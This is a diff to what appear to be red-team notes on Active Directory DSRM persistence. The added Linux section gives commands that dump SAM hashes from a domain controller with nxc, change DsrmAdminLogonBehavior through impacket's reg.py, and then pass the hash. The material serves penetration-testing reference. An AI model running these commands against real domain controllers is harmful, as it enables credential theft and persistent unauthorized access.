@@ -20,3 +20,16 @@ Directory Services Restore Mode (DSRM) is a safe boot mode which allows emergenc
 
     New-ItemProperty 'HKLM:\System\CurrentControlSet\Control\Lsa\' -Name 'DsrmAdminLogonBehaviour' -Value 2 -PropertyType DWORD -Verbose
 
+## Linux
+
+### 1) Dump DSRM Password
+
+    nxc smb <DC_IP> -u user1 -p password --sam
+
+### 2) Change registry configuration
+
+Need to change the logon behavior before pass the hash
+
+    reg.py -dc-ip <DC_IP> 'domain.local'/'Administrator':'password'@dc.domain.local add -keyName 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\' -v 'DsrmAdminLogonBehavior' -vd 2 -vt REG_DWORD
+
+Now the DSRM hash can be used to authenticate
